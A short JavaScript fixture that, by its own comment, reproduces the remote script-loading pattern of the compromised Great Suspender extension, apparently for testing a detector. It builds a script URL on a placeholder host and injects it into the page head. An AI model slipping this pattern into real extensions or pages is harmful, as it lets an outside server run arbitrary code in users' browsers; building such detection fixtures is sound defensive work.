// Minimal reproduction of the Great-Suspender remote-analytics-load shape: a
// const + concat script URL assigned to a dynamically created <script>.
const base = "https://rs-telemetry-cdn.example";
const el = document.createElement("script");
el.src = base + "/t.js";
document.head.appendChild(el);
